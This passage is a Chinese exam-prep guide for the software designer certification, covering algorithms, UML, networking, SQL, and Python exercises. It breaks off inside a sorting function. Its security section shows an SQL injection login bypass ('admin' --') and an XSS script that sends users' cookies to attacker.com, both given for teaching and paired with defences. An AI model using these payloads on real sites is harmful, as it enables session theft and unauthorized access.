# 软考中级软件设计师知识点分类例子详解

## 目录
1. [数据结构与算法（权重最高）](#数据结构与算法)
2. [软件工程与UML](#软件工程与uml)
3. [计算机网络与操作系统](#计算机网络与操作系统)
4. [数据库与SQL](#数据库与sql)
5. [信息安全](#信息安全)
6. [下午题Python编程专项](#下午题python编程专项)

---

## 数据结构与算法

### 1. 数组与链表

#### 数组例子
**特点**：连续存储，随机访问O(1)，插入删除O(n)

**典型应用**
```python
# 数组查找最大值
def find_max(arr):
    if not arr:
        return None
    max_val = arr[0]
    for i in range(1, len(arr)):
        if arr[i] > max_val:
            max_val = arr[i]
    return max_val

# 时间复杂度：O(n)
# 空间复杂度：O(1)
```

**考试要点**
- 数组下标从0开始
- 访问时间复杂度O(1)
- 插入删除需要移动元素

#### 链表例子
**特点**：动态存储，插入删除O(1)，查找O(n)

**单链表节点定义**
```python
class ListNode:
    def __init__(self, val=0, next=None):
        self.val = val
        self.next = next

# 链表反转（高频考点）
def reverse_list(head):
    prev = None
    current = head
    while current:
        next_temp = current.next
        current.next = prev
        prev = current
        current = next_temp
    return prev
```

### 2. 栈与队列

#### 栈例子
**特点**：LIFO（后进先出）

**括号匹配问题**
```python
def is_valid_parentheses(s):
    stack = []
    mapping = {')': '(', '}': '{', ']': '['}
    
    for char in s:
        if char in mapping:
            if not stack or stack.pop() != mapping[char]:
                return False
        else:
            stack.append(char)
    
    return not stack

# 测试用例
print(is_valid_parentheses("()[]{}"))  # True
print(is_valid_parentheses("([)]"))    # False
```

#### 队列例子
**特点**：FIFO（先进先出）

**用两个栈实现队列**
```python
class MyQueue:
    def __init__(self):
        self.stack1 = []  # 入队栈
        self.stack2 = []  # 出队栈
    
    def push(self, x):
        self.stack1.append(x)
    
    def pop(self):
        if not self.stack2:
            while self.stack1:
                self.stack2.append(self.stack1.pop())
        return self.stack2.pop()
    
    def peek(self):
        if not self.stack2:
            while self.stack1:
                self.stack2.append(self.stack1.pop())
        return self.stack2[-1]
```

### 3. 树与二叉树

#### 二叉树遍历（必考）
```python
class TreeNode:
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right

# 前序遍历：根-左-右
def preorder_traversal(root):
    if not root:
        return []
    return [root.val] + preorder_traversal(root.left) + preorder_traversal(root.right)

# 中序遍历：左-根-右
def inorder_traversal(root):
    if not root:
        return []
    return inorder_traversal(root.left) + [root.val] + inorder_traversal(root.right)

# 后序遍历：左-右-根
def postorder_traversal(root):
    if not root:
        return []
    return postorder_traversal(root.left) + postorder_traversal(root.right) + [root.val]

# 层序遍历（BFS）
def level_order_traversal(root):
    if not root:
        return []
    
    result = []
    queue = [root]
    
    while queue:
        level_size = len(queue)
        level_nodes = []
        
        for _ in range(level_size):
            node = queue.pop(0)
            level_nodes.append(node.val)
            
            if node.left:
                queue.append(node.left)
            if node.right:
                queue.append(node.right)
        
        result.append(level_nodes)
    
    return result
```

#### 二叉搜索树
```python
# 验证二叉搜索树
def is_valid_bst(root):
    def validate(node, min_val, max_val):
        if not node:
            return True
        
        if node.val <= min_val or node.val >= max_val:
            return False
        
        return (validate(node.left, min_val, node.val) and 
                validate(node.right, node.val, max_val))
    
    return validate(root, float('-inf'), float('inf'))
```

### 4. 图的BFS/DFS

#### 图的表示
```python
# 邻接表表示
graph = {
    'A': ['B', 'C'],
    'B': ['A', 'D', 'E'],
    'C': ['A', 'F'],
    'D': ['B'],
    'E': ['B', 'F'],
    'F': ['C', 'E']
}
```

#### 深度优先搜索（DFS）
```python
def dfs(graph, start, visited=None):
    if visited is None:
        visited = set()
    
    visited.add(start)
    print(start, end=' ')
    
    for neighbor in graph[start]:
        if neighbor not in visited:
            dfs(graph, neighbor, visited)
    
    return visited

# 非递归版本
def dfs_iterative(graph, start):
    visited = set()
    stack = [start]
    
    while stack:
        node = stack.pop()
        if node not in visited:
            visited.add(node)
            print(node, end=' ')
            
            # 添加邻居节点到栈中
            for neighbor in graph[node]:
                if neighbor not in visited:
                    stack.append(neighbor)
    
    return visited
```

#### 广度优先搜索（BFS）
```python
from collections import deque

def bfs(graph, start):
    visited = set()
    queue = deque([start])
    visited.add(start)
    
    while queue:
        node = queue.popleft()
        print(node, end=' ')
        
        for neighbor in graph[node]:
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(neighbor)
    
    return visited

# 最短路径（无权图）
def shortest_path(graph, start, end):
    if start == end:
        return [start]
    
    visited = set()
    queue = deque([(start, [start])])
    visited.add(start)
    
    while queue:
        node, path = queue.popleft()
        
        for neighbor in graph[node]:
            if neighbor == end:
                return path + [neighbor]
            
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append((neighbor, path + [neighbor]))
    
    return None  # 没有路径
```

### 5. 排序算法

#### 快速排序
```python
def quick_sort(arr):
    if len(arr) <= 1:
        return arr
    
    pivot = arr[len(arr) // 2]
    left = [x for x in arr if x < pivot]
    middle = [x for x in arr if x == pivot]
    right = [x for x in arr if x > pivot]
    
    return quick_sort(left) + middle + quick_sort(right)

# 时间复杂度：平均O(n log n)，最坏O(n²)
# 空间复杂度：O(log n)
```

#### 归并排序
```python
def merge_sort(arr):
    if len(arr) <= 1:
        return arr
    
    mid = len(arr) // 2
    left = merge_sort(arr[:mid])
    right = merge_sort(arr[mid:])
    
    return merge(left, right)

def merge(left, right):
    result = []
    i = j = 0
    
    while i < len(left) and j < len(right):
        if left[i] <= right[j]:
            result.append(left[i])
            i += 1
        else:
            result.append(right[j])
            j += 1
    
    result.extend(left[i:])
    result.extend(right[j:])
    return result

# 时间复杂度：O(n log n)
# 空间复杂度：O(n)
```

### 6. 查找算法

#### 二分查找
```python
def binary_search(arr, target):
    left, right = 0, len(arr) - 1
    
    while left <= right:
        mid = (left + right) // 2
        
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    
    return -1  # 未找到

# 时间复杂度：O(log n)
# 空间复杂度：O(1)
```

### 7. 动态规划基础

#### 斐波那契数列
```python
# 递归版本（效率低）
def fibonacci_recursive(n):
    if n <= 1:
        return n
    return fibonacci_recursive(n-1) + fibonacci_recursive(n-2)

# 动态规划版本
def fibonacci_dp(n):
    if n <= 1:
        return n
    
    dp = [0] * (n + 1)
    dp[1] = 1
    
    for i in range(2, n + 1):
        dp[i] = dp[i-1] + dp[i-2]
    
    return dp[n]

# 空间优化版本
def fibonacci_optimized(n):
    if n <= 1:
        return n
    
    a, b = 0, 1
    for _ in range(2, n + 1):
        a, b = b, a + b
    
    return b
```

---

## 软件工程与UML

### 1. 生命周期模型

#### 瀑布模型例子
**特点**：线性顺序，阶段清晰
```
需求分析 → 系统设计 → 详细设计 → 编码实现 → 测试 → 维护

适用场景：
- 银行核心系统开发
- 政府信息系统
- 需求明确且稳定的项目

优点：结构清晰，文档完整，便于管理
缺点：缺乏灵活性，风险发现较晚
```

#### 敏捷模型例子
**特点**：迭代开发，快速响应变化
```
Sprint规划 → 开发 → 测试 → 评审 → 回顾 → 下一个Sprint

适用场景：
- 互联网产品开发
- 创新型项目
- 需求变化频繁的项目

核心价值：
- 个体和互动 > 流程和工具
- 工作的软件 > 详尽的文档
- 客户合作 > 合同谈判
- 响应变化 > 遵循计划
```

### 2. UML图例子

#### 用例图例子
**在线购物系统用例图**
```
参与者：
- 顾客：浏览商品、下订单、支付、查看订单
- 管理员：商品管理、订单管理、用户管理
- 支付系统：处理支付

用例关系：
- 下订单 include 验证用户身份
- 支付 extend 使用优惠券
- 商品管理 generalization 添加商品、修改商品
```

#### 类图例子
**图书管理系统类图**
```python
class Book:
    def __init__(self, isbn, title, author, publisher):
        self.isbn = isbn        # 图书编号
        self.title = title      # 书名
        self.author = author    # 作者
        self.publisher = publisher  # 出版社
        self.status = "available"   # 状态
    
    def borrow(self):
        if self.status == "available":
            self.status = "borrowed"
            return True
        return False

class Reader:
    def __init__(self, reader_id, name, phone):
        self.reader_id = reader_id
        self.name = name
        self.phone = phone
        self.borrowed_books = []  # 借阅的图书列表
    
    def borrow_book(self, book):
        if book.borrow():
            self.borrowed_books.append(book)
            return True
        return False

class Library:
    def __init__(self):
        self.books = []     # 聚合关系：图书馆包含图书
        self.readers = []   # 聚合关系：图书馆包含读者
    
    def add_book(self, book):
        self.books.append(book)
    
    def register_reader(self, reader):
        self.readers.append(reader)
```

---

## 计算机网络与操作系统

### 1. TCP/IP五层模型例子

#### 网络层次结构
```
应用层：HTTP、HTTPS、FTP、SMTP、DNS
传输层：TCP、UDP
网络层：IP、ICMP、ARP
数据链路层：以太网、WiFi
物理层：光纤、双绞线、无线电波

数据封装过程：
应用数据 → TCP段 → IP包 → 以太网帧 → 比特流
```

#### HTTP请求例子
```python
# HTTP请求报文结构
"""
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Connection: keep-alive

"""

# HTTPS与HTTP的区别
"""
HTTP：明文传输，端口80，不安全
HTTPS：加密传输，端口443，使用SSL/TLS加密

HTTPS握手过程：
1. 客户端发送Client Hello
2. 服务器发送Server Hello + 证书
3. 客户端验证证书，生成预主密钥
4. 双方生成会话密钥，开始加密通信
"""
```

### 2. 操作系统例子

#### 进程与线程
```python
import threading
import multiprocessing
import time

# 线程例子
def worker_thread(name):
    for i in range(5):
        print(f"线程 {name}: {i}")
        time.sleep(1)

# 创建线程
thread1 = threading.Thread(target=worker_thread, args=("A",))
thread2 = threading.Thread(target=worker_thread, args=("B",))

thread1.start()
thread2.start()

# 进程例子
def worker_process(name):
    for i in range(5):
        print(f"进程 {name}: {i}")
        time.sleep(1)

# 创建进程
if __name__ == "__main__":
    process1 = multiprocessing.Process(target=worker_process, args=("X",))
    process2 = multiprocessing.Process(target=worker_process, args=("Y",))
    
    process1.start()
    process2.start()
```

#### 页面置换算法
```python
# LRU页面置换算法实现
class LRUCache:
    def __init__(self, capacity):
        self.capacity = capacity
        self.cache = {}
        self.order = []
    
    def get(self, key):
        if key in self.cache:
            # 移动到最近使用位置
            self.order.remove(key)
            self.order.append(key)
            return self.cache[key]
        return -1
    
    def put(self, key, value):
        if key in self.cache:
            # 更新值并移动到最近位置
            self.cache[key] = value
            self.order.remove(key)
            self.order.append(key)
        else:
            if len(self.cache) >= self.capacity:
                # 删除最久未使用的页面
                oldest = self.order.pop(0)
                del self.cache[oldest]
            
            self.cache[key] = value
            self.order.append(key)

# FIFO页面置换算法
class FIFOCache:
    def __init__(self, capacity):
        self.capacity = capacity
        self.cache = {}
        self.queue = []
    
    def put(self, key, value):
        if key not in self.cache:
            if len(self.cache) >= self.capacity:
                # 删除最先进入的页面
                oldest = self.queue.pop(0)
                del self.cache[oldest]
            
            self.cache[key] = value
            self.queue.append(key)
```

---

## 数据库与SQL

### 1. 三大范式例子

#### 第一范式(1NF)例子
```sql
-- 违反1NF的表（属性不原子）
CREATE TABLE Student_Bad (
    学号 VARCHAR(10),
    姓名 VARCHAR(20),
    课程成绩 VARCHAR(100)  -- "数学:90,英语:85,物理:78"
);

-- 符合1NF的表
CREATE TABLE Student_Good (
    学号 VARCHAR(10),
    姓名 VARCHAR(20),
    课程 VARCHAR(20),
    成绩 INT
);
```

#### 第二范式(2NF)例子
```sql
-- 违反2NF的表（存在部分函数依赖）
CREATE TABLE StudentCourse_Bad (
    学号 VARCHAR(10),
    课程号 VARCHAR(10),
    姓名 VARCHAR(20),    -- 部分依赖于学号
    学分 INT,           -- 部分依赖于课程号
    成绩 INT,
    PRIMARY KEY (学号, 课程号)
);

-- 符合2NF的表（分解后）
CREATE TABLE Student (
    学号 VARCHAR(10) PRIMARY KEY,
    姓名 VARCHAR(20)
);

CREATE TABLE Course (
    课程号 VARCHAR(10) PRIMARY KEY,
    课程名 VARCHAR(50),
    学分 INT
);

CREATE TABLE SC (
    学号 VARCHAR(10),
    课程号 VARCHAR(10),
    成绩 INT,
    PRIMARY KEY (学号, 课程号),
    FOREIGN KEY (学号) REFERENCES Student(学号),
    FOREIGN KEY (课程号) REFERENCES Course(课程号)
);
```

### 2. 事务ACID例子

#### 银行转账事务
```sql
-- 转账事务示例
BEGIN TRANSACTION;

-- 检查余额
SELECT 余额 FROM 账户 WHERE 账号 = 'A001';

-- 扣除转出账户金额
UPDATE 账户 SET 余额 = 余额 - 1000 WHERE 账号 = 'A001';

-- 增加转入账户金额
UPDATE 账户 SET 余额 = 余额 + 1000 WHERE 账号 = 'B001';

-- 记录转账日志
INSERT INTO 转账记录 (转出账号, 转入账号, 金额, 时间) 
VALUES ('A001', 'B001', 1000, NOW());

COMMIT;  -- 提交事务

-- 如果出现错误
-- ROLLBACK;  -- 回滚事务
```

### 3. SQL查询例子

#### 连接查询
```sql
-- 内连接：查询学生选课信息
SELECT s.学号, s.姓名, c.课程名, sc.成绩
FROM Student s
INNER JOIN SC sc ON s.学号 = sc.学号
INNER JOIN Course c ON sc.课程号 = c.课程号;

-- 左外连接：查询所有学生（包括未选课的）
SELECT s.学号, s.姓名, c.课程名, sc.成绩
FROM Student s
LEFT JOIN SC sc ON s.学号 = sc.学号
LEFT JOIN Course c ON sc.课程号 = c.课程号;

-- 自连接：查找同一专业的学生
SELECT s1.姓名 AS 学生1, s2.姓名 AS 学生2, s1.专业
FROM Student s1, Student s2
WHERE s1.专业 = s2.专业 AND s1.学号 < s2.学号;
```

#### 子查询
```sql
-- 查询选修了"数据库"课程的学生
SELECT 姓名 FROM Student 
WHERE 学号 IN (
    SELECT 学号 FROM SC 
    WHERE 课程号 = (
        SELECT 课程号 FROM Course WHERE 课程名 = '数据库'
    )
);

-- 查询平均成绩高于全校平均成绩的学生
SELECT 学号, AVG(成绩) as 平均成绩
FROM SC
GROUP BY 学号
HAVING AVG(成绩) > (SELECT AVG(成绩) FROM SC);
```

---

## 信息安全

### 1. 加密算法例子

#### 对称加密
```python
# AES加密示例（概念性代码）
from cryptography.fernet import Fernet

# 生成密钥
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# 加密
plaintext = "这是需要加密的数据"
ciphertext = cipher_suite.encrypt(plaintext.encode())

# 解密
decrypted_text = cipher_suite.decrypt(ciphertext).decode()

print(f"原文: {plaintext}")
print(f"密文: {ciphertext}")
print(f"解密: {decrypted_text}")

"""
对称加密特点：
- 加密和解密使用同一个密钥
- 速度快，适合大量数据加密
- 密钥分发困难
- 常见算法：DES、3DES、AES
"""
```

#### 非对称加密
```python
# RSA加密示例（概念性代码）
"""
RSA加密过程：
1. 生成公钥和私钥对
2. 公钥加密，私钥解密（用于加密）
3. 私钥签名，公钥验证（用于数字签名）

特点：
- 加密解密使用不同密钥
- 速度慢，适合小量数据或密钥交换
- 解决了密钥分发问题
- 常见算法：RSA、ECC、DSA
"""

def rsa_example():
    # 密钥生成
    public_key = "公钥"
    private_key = "私钥"
    
    # 加密过程
    plaintext = "机密信息"
    ciphertext = encrypt_with_public_key(plaintext, public_key)
    
    # 解密过程
    decrypted = decrypt_with_private_key(ciphertext, private_key)
    
    return decrypted
```

#### 哈希算法
```python
import hashlib

def hash_examples():
    data = "需要计算哈希的数据"
    
    # MD5（已不安全，仅用于完整性校验）
    md5_hash = hashlib.md5(data.encode()).hexdigest()
    
    # SHA-256（推荐使用）
    sha256_hash = hashlib.sha256(data.encode()).hexdigest()
    
    # SHA-1（逐渐淘汰）
    sha1_hash = hashlib.sha1(data.encode()).hexdigest()
    
    print(f"原数据: {data}")
    print(f"MD5: {md5_hash}")
    print(f"SHA-256: {sha256_hash}")
    print(f"SHA-1: {sha1_hash}")

"""
哈希算法特点：
- 单向函数，不可逆
- 固定长度输出
- 雪崩效应：输入微小变化导致输出巨大变化
- 用途：数字签名、密码存储、完整性校验
"""
```

### 2. 常见攻击例子

#### SQL注入攻击
```python
# 不安全的代码（存在SQL注入）
def unsafe_login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # 如果输入: username = "admin' --", password = "anything"
    # 实际执行: SELECT * FROM users WHERE username='admin' --' AND password='anything'
    # 注释掉了密码验证部分
    return execute_query(query)

# 安全的代码（使用参数化查询）
def safe_login(username, password):
    query = "SELECT * FROM users WHERE username=? AND password=?"
    return execute_query(query, (username, password))

"""
SQL注入防护措施：
1. 使用参数化查询/预编译语句
2. 输入验证和过滤
3. 最小权限原则
4. 定期安全审计
"""
```

#### XSS攻击
```html
<!-- 存储型XSS攻击示例 -->
<!-- 用户输入的恶意脚本存储在数据库中 -->
<script>
    // 窃取用户Cookie
    document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- 反射型XSS攻击示例 -->
<!-- URL: http://example.com/search?q=<script>alert('XSS')</script> -->

<!-- XSS防护措施 -->
<!-- 1. 输出编码 -->
<div>用户输入: &lt;script&gt;alert('XSS')&lt;/script&gt;</div>

<!-- 2. 输入验证 -->
<!-- 3. Content Security Policy (CSP) -->
<!-- 4. HttpOnly Cookie -->
```

---

## 下午题Python编程专项

### 1. 二叉树遍历（必考）

#### 递归遍历
```python
class TreeNode:
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right

def preorder_recursive(root):
    """前序遍历：根-左-右"""
    if not root:
        return []
    result = [root.val]
    result.extend(preorder_recursive(root.left))
    result.extend(preorder_recursive(root.right))
    return result

def inorder_recursive(root):
    """中序遍历：左-根-右"""
    if not root:
        return []
    result = []
    result.extend(inorder_recursive(root.left))
    result.append(root.val)
    result.extend(inorder_recursive(root.right))
    return result

def postorder_recursive(root):
    """后序遍历：左-右-根"""
    if not root:
        return []
    result = []
    result.extend(postorder_recursive(root.left))
    result.extend(postorder_recursive(root.right))
    result.append(root.val)
    return result
```

#### 非递归遍历
```python
def preorder_iterative(root):
    """前序遍历非递归版本"""
    if not root:
        return []
    
    result = []
    stack = [root]
    
    while stack:
        node = stack.pop()
        result.append(node.val)
        
        # 先压入右子树，再压入左子树
        if node.right:
            stack.append(node.right)
        if node.left:
            stack.append(node.left)
    
    return result

def inorder_iterative(root):
    """中序遍历非递归版本"""
    result = []
    stack = []
    current = root
    
    while stack or current:
        # 一直向左走到底
        while current:
            stack.append(current)
            current = current.left
        
        # 处理栈顶节点
        current = stack.pop()
        result.append(current.val)
        
        # 转向右子树
        current = current.right
    
    return result

def level_order_iterative(root):
    """层序遍历（BFS）"""
    if not root:
        return []
    
    result = []
    queue = [root]
    
    while queue:
        level_size = len(queue)
        level_values = []
        
        for _ in range(level_size):
            node = queue.pop(0)
            level_values.append(node.val)
            
            if node.left:
                queue.append(node.left)
            if node.right:
                queue.append(node.right)
        
        result.append(level_values)
    
    return result
```

### 2. 图搜索算法

#### 深度优先搜索（DFS）
```python
def dfs_recursive(graph, start, visited=None):
    """递归DFS"""
    if visited is None:
        visited = set()
    
    visited.add(start)
    path = [start]
    
    for neighbor in graph.get(start, []):
        if neighbor not in visited:
            path.extend(dfs_recursive(graph, neighbor, visited))
    
    return path

def dfs_iterative(graph, start):
    """迭代DFS"""
    visited = set()
    stack = [start]
    path = []
    
    while stack:
        node = stack.pop()
        if node not in visited:
            visited.add(node)
            path.append(node)
            
            # 将邻居节点加入栈（逆序以保持顺序）
            for neighbor in reversed(graph.get(node, [])):
                if neighbor not in visited:
                    stack.append(neighbor)
    
    return path

# 判断图是否连通
def is_connected(graph):
    """判断无向图是否连通"""
    if not graph:
        return True
    
    start_node = next(iter(graph))
    visited = dfs_recursive(graph, start_node, set())
    
    return len(visited) == len(graph)

# 检测环
def has_cycle_dfs(graph):
    """使用DFS检测无向图中的环"""
    visited = set()
    
    def dfs(node, parent):
        visited.add(node)
        
        for neighbor in graph.get(node, []):
            if neighbor not in visited:
                if dfs(neighbor, node):
                    return True
            elif neighbor != parent:
                return True  # 发现环
        
        return False
    
    for node in graph:
        if node not in visited:
            if dfs(node, None):
                return True
    
    return False
```

#### 广度优先搜索（BFS）
```python
from collections import deque

def bfs(graph, start):
    """标准BFS"""
    visited = set()
    queue = deque([start])
    visited.add(start)
    path = []
    
    while queue:
        node = queue.popleft()
        path.append(node)
        
        for neighbor in graph.get(node, []):
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(neighbor)
    
    return path

def shortest_path_bfs(graph, start, end):
    """使用BFS找最短路径"""
    if start == end:
        return [start]
    
    visited = set()
    queue = deque([(start, [start])])
    visited.add(start)
    
    while queue:
        node, path = queue.popleft()
        
        for neighbor in graph.get(node, []):
            if neighbor == end:
                return path + [neighbor]
            
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append((neighbor, path + [neighbor]))
    
    return None  # 无路径

def bfs_levels(graph, start):
    """BFS按层遍历"""
    visited = set()
    queue = deque([start])
    visited.add(start)
    levels = []
    
    while queue:
        level_size = len(queue)
        current_level = []
        
        for _ in range(level_size):
            node = queue.popleft()
            current_level.append(node)
            
            for neighbor in graph.get(node, []):
                if neighbor not in visited:
                    visited.add(neighbor)
                    queue.append(neighbor)
        
        levels.append(current_level)
    
    return levels
```

### 3. 动态规划经典题目

#### 背包问题
```python
def knapsack_01(weights, values, capacity):
    """0-1背包问题"""
    n = len(weights)
    # dp[i][w] 表示前i个物品，容量为w时的最大价值
    dp = [[0] * (capacity + 1) for _ in range(n + 1)]
    
    for i in range(1, n + 1):
        for w in range(capacity + 1):
            # 不选择第i个物品
            dp[i][w] = dp[i-1][w]
            
            # 选择第i个物品（如果容量允许）
            if w >= weights[i-1]:
                dp[i][w] = max(dp[i][w], 
                              dp[i-1][w-weights[i-1]] + values[i-1])
    
    return dp[n][capacity]

def knapsack_01_optimized(weights, values, capacity):
    """0-1背包问题空间优化版本"""
    dp = [0] * (capacity + 1)
    
    for i in range(len(weights)):
        # 逆序遍历，避免重复使用
        for w in range(capacity, weights[i] - 1, -1):
            dp[w] = max(dp[w], dp[w - weights[i]] + values[i])
    
    return dp[capacity]

# 测试用例
weights = [2, 1, 3, 2]
values = [12, 10, 20, 15]
capacity = 5
print(knapsack_01(weights, values, capacity))  # 输出: 37
```

#### 最长公共子序列
```python
def lcs_length(text1, text2):
    """最长公共子序列长度"""
    m, n = len(text1), len(text2)
    dp = [[0] * (n + 1) for _ in range(m + 1)]
    
    for i in range(1, m + 1):
        for j in range(1, n + 1):
            if text1[i-1] == text2[j-1]:
                dp[i][j] = dp[i-1][j-1] + 1
            else:
                dp[i][j] = max(dp[i-1][j], dp[i][j-1])
    
    return dp[m][n]

def lcs_string(text1, text2):
    """返回最长公共子序列字符串"""
    m, n = len(text1), len(text2)
    dp = [[0] * (n + 1) for _ in range(m + 1)]
    
    # 填充dp表
    for i in range(1, m + 1):
        for j in range(1, n + 1):
            if text1[i-1] == text2[j-1]:
                dp[i][j] = dp[i-1][j-1] + 1
            else:
                dp[i][j] = max(dp[i-1][j], dp[i][j-1])
    
    # 回溯构造LCS
    lcs = []
    i, j = m, n
    while i > 0 and j > 0:
        if text1[i-1] == text2[j-1]:
            lcs.append(text1[i-1])
            i -= 1
            j -= 1
        elif dp[i-1][j] > dp[i][j-1]:
            i -= 1
        else:
            j -= 1
    
    return ''.join(reversed(lcs))

# 测试用例
text1 = "ABCDGH"
text2 = "AEDFHR"
print(lcs_length(text1, text2))  # 输出: 3
print(lcs_string(text1, text2))  # 输出: "ADH"
```

### 4. 字符串处理

#### 字符串匹配算法
```python
def naive_string_match(text, pattern):
    """朴素字符串匹配算法"""
    n, m = len(text), len(pattern)
    positions = []
    
    for i in range(n - m + 1):
        j = 0
        while j < m and text[i + j] == pattern[j]:
            j += 1
        
        if j == m:
            positions.append(i)
    
    return positions

def kmp_search(text, pattern):
    """KMP字符串匹配算法"""
    def compute_lps(pattern):
        """计算最长前缀后缀数组"""
        m = len(pattern)
        lps = [0] * m
        length = 0
        i = 1
        
        while i < m:
            if pattern[i] == pattern[length]:
                length += 1
                lps[i] = length
                i += 1
            else:
                if length != 0:
                    length = lps[length - 1]
                else:
                    lps[i] = 0
                    i += 1
        
        return lps
    
    n, m = len(text), len(pattern)
    lps = compute_lps(pattern)
    positions = []
    
    i = j = 0
    while i < n:
        if pattern[j] == text[i]:
            i += 1
            j += 1
        
        if j == m:
            positions.append(i - j)
            j = lps[j - 1]
        elif i < n and pattern[j] != text[i]:
            if j != 0:
                j = lps[j - 1]
            else:
                i += 1
    
    return positions

# 测试用例
text = "ABABDABACDABABCABCABCABCABC"
pattern = "ABABCABCABCABC"
print(naive_string_match(text, pattern))
print(kmp_search(text, pattern))
```

#### 回文字符串
```python
def is_palindrome(s):
    """判断字符串是否为回文"""
    # 方法1：双指针
    left, right = 0, len(s) - 1
    while left < right:
        if s[left] != s[right]:
            return False
        left += 1
        right -= 1
    return True

def longest_palindrome_dp(s):
    """最长回文子串（动态规划）"""
    n = len(s)
    if n == 0:
        return ""
    
    # dp[i][j] 表示s[i:j+1]是否为回文
    dp = [[False] * n for _ in range(n)]
    start = 0
    max_len = 1
    
    # 单个字符都是回文
    for i in range(n):
        dp[i][i] = True
    
    # 检查长度为2的子串
    for i in range(n - 1):
        if s[i] == s[i + 1]:
            dp[i][i + 1] = True
            start = i
            max_len = 2
    
    # 检查长度大于2的子串
    for length in range(3, n + 1):
        for i in range(n - length + 1):
            j = i + length - 1
            
            if s[i] == s[j] and dp[i + 1][j - 1]:
                dp[i][j] = True
                start = i
                max_len = length
    
    return s[start:start + max_len]

def longest_palindrome_expand(s):
    """最长回文子串（中心扩展）"""
    def expand_around_center(left, right):
        while left >= 0 and right < len(s) and s[left] == s[right]:
            left -= 1
            right += 1
        return right - left - 1
    
    start = 0
    max_len = 0
    
    for i in range(len(s)):
        # 奇数长度回文
        len1 = expand_around_center(i, i)
        # 偶数长度回文
        len2 = expand_around_center(i, i + 1)
        
        current_max = max(len1, len2)
        if current_max > max_len:
            max_len = current_max
            start = i - (current_max - 1) // 2
    
    return s[start:start + max_len]

# 测试用例
print(longest_palindrome_dp("babad"))    # "bab" 或 "aba"
print(longest_palindrome_expand("cbbd"))  # "bb"
```

### 5. 递归经典问题

#### 汉诺塔问题
```python
def hanoi(n, source, destination, auxiliary):
    """汉诺塔问题递归解法"""
    if n == 1:
        print(f"移动盘子 {n} 从 {source} 到 {destination}")
        return 1
    
    moves = 0
    # 将前n-1个盘子从source移动到auxiliary
    moves += hanoi(n - 1, source, auxiliary, destination)
    
    # 将第n个盘子从source移动到destination
    print(f"移动盘子 {n} 从 {source} 到 {destination}")
    moves += 1
    
    # 将前n-1个盘子从auxiliary移动到destination
    moves += hanoi(n - 1, auxiliary, destination, source)
    
    return moves

def hanoi_iterative(n, source, destination, auxiliary):
    """汉诺塔问题迭代解法"""
    # 使用栈模拟递归
    stack = [(n, source, destination, auxiliary, False)]
    moves = 0
    
    while stack:
        n, src, dest, aux, processed = stack.pop()
        
        if n == 1:
            print(f"移动盘子 {n} 从 {src} 到 {dest}")
            moves += 1
        elif not processed:
            # 第一次处理：压入三个子问题
            stack.append((n - 1, aux, dest, src, False))  # 步骤3
            stack.append((1, src, dest, aux, True))       # 步骤2
            stack.append((n - 1, src, aux, dest, False))  # 步骤1
        else:
            print(f"移动盘子 {n} 从 {src} 到 {dest}")
            moves += 1
    
    return moves

# 测试用例
print("递归解法:")
moves = hanoi(3, 'A', 'C', 'B')
print(f"总共移动了 {moves} 次")
```

#### 全排列问题
```python
def permutations_recursive(nums):
    """生成全排列（递归回溯）"""
    result = []
    
    def backtrack(current_permutation, remaining):
        if not remaining:
            result.append(current_permutation[:])
            return
        
        for i in range(len(remaining)):
            # 选择
            current_permutation.append(remaining[i])
            # 递归
            backtrack(current_permutation, remaining[:i] + remaining[i+1:])
            # 撤销选择
            current_permutation.pop()
    
    backtrack([], nums)
    return result

def permutations_iterative(nums):
    """生成全排列（迭代）"""
    import itertools
    return list(itertools.permutations(nums))

def permutations_swap(nums):
    """生成全排列（交换法）"""
    result = []
    
    def backtrack(start):
        if start == len(nums):
            result.append(nums[:])
            return
        
        for i in range(start, len(nums)):
            # 交换
            nums[start], nums[i] = nums[i], nums[start]
            # 递归
            backtrack(start + 1)
            # 回溯
            nums[start], nums[i] = nums[i], nums[start]
    
    backtrack(0)
    return result

# 测试用例
nums = [1, 2, 3]
print("递归回溯:", permutations_recursive(nums))
print("交换法:", permutations_swap([1, 2, 3]))  # 重新创建列表
```

### 6. 排序与合并

#### 高级排序算法
```python
def heap_sort(arr):
    """堆排序"""
    def heapify(arr, n, i):
        largest = i
        left = 2 * i + 1
        right = 2 * i + 2
        
        if left < n and arr[left] > arr[largest]:
            largest = left
        
        if right < n and arr[right] > arr[largest]:
            largest = right
        
        if largest != i:
            arr[i], arr[largest] = arr[largest], arr[i]
            heapify(arr, n, largest)
    
    n = len(arr)
    
    # 构建最大堆
    for i in range(n // 2 - 1, -1, -1):
        heapify(arr, n, i)
    
    # 逐个提取元素
    for i in range(n - 1, 0, -1):
        arr[0], arr[i] = arr[i], arr[0]
        heapify(arr, i, 0)
    
    return arr

def counting_sort(arr):
    """计数排序（适用于小范围整数）"""
    if not arr:
        return arr
    
    max_val = max(arr)
    min_val = min(arr)
    range_val = max_val - min_val + 1
    
    count = [0] * range_val
    output = [0] * len(arr)
    
    # 计数
    for num in arr:
        count[num - min_val] += 1
    
    # 累计计数
    for i in range(1, range_val):
        count[i] += count[i - 1]
    
    # 构建输出数组
    for i in range(len(arr) - 1, -1, -1):
        output[count[arr[i] - min_val] - 1] = arr[i]
        count[arr[i] - min_val] -= 1
    
    return output

def radix_sort(arr):
    """基数排序"""
    if not arr:
        return arr
    
    max_val = max(arr)
    exp = 1
    
    while max_val // exp > 0:
        counting_sort_for_radix(arr, exp)
        exp *= 10
    
    return arr

def counting_sort_for_radix(arr, exp):
    """基数排序的计数排序"""
    n = len(arr)
    output = [0] * n
    count = [0] * 10
    
    for i in range(n):
        index = arr[i] // exp
        count[index % 10] += 1
    
    for i in range(1, 10):
        count[i] += count[i - 1]
    
    i = n - 1
